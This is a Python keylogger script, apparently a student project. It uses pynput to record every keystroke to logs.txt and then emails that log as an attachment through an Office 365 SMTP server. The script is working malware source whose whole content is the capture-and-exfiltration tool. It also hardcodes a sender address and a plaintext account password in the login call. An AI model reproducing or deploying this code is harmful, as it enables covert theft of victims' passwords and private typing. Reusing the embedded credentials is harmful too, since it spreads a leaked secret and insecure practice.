#importing libraries

import pynput
from pynput.keyboard import Key , Listener
import smtplib
from email.message import EmailMessage

#making variable k with empty list to save the keystrokes.
k=[]

#defining parameters

def on_press(key):
    k.append(key)                     #transfer all the key strokes to the "k" var/list
    write_1(k)
    print(key)

def write_1(key):
    with open("logs.txt", "a") as f:  #here using file handling to save a txt file,
        f.write(str(key))             #and saving it as append so that it cannot overwrite the data

def on_release(key):                  #notice the key when releases and also the no. of times pressed.
    if key == Key.esc:                #if esc key is pressed the keylogger will stops.(Here, you can select which ever key you want to stop the execution)
        
        return False


with Listener(on_press=on_press , on_release = on_release) as l:
    l.join()

import time
start_time = time.time()
seconds = 10

while True:
    current_time = time.time()
    elapsed_time = current_time - start_time

    if elapsed_time > seconds:
        print("Finished iterating in: " + str(int(elapsed_time))  + " seconds")
        break


def send_mail():                                    #parameter to send the file over email.
    msg = EmailMessage()
    subject = 'Keylogger File '                     #subject of the email.
    #plain_body = 'This is plain text'
    html_body = ''' Here is the Keylogger File. ''' #body of the email
    
    msg['Subject'] = subject
    msg['From'] = "suyash.12019547@lpu.in"          #sender's address
    msg['To'] = "suyash.12019547@lpu.in"            #reciver's address
    #msg.set_content(plain_body, subtype='text')
    msg.add_alternative(html_body, subtype='html')

        # Text or text like file    
    with open('logs.txt', 'r') as f:
        msg.add_attachment(f.read(),
                           filename='logs.txt'
                           )
        
        
    with smtplib.SMTP('smtp.office365.com', 587) as smtp:  #smtp services use according to the email provider
        smtp.starttls()                                    #starting service with security
        smtp.login("suyash.12019547@lpu.in", "UP80s3842")  #login id and password of the sender
        smtp.send_message(msg)                             
        print('Email Send!!')                              #when email will be sent it will print 


if __name__ == '__main__':
    send_mail()


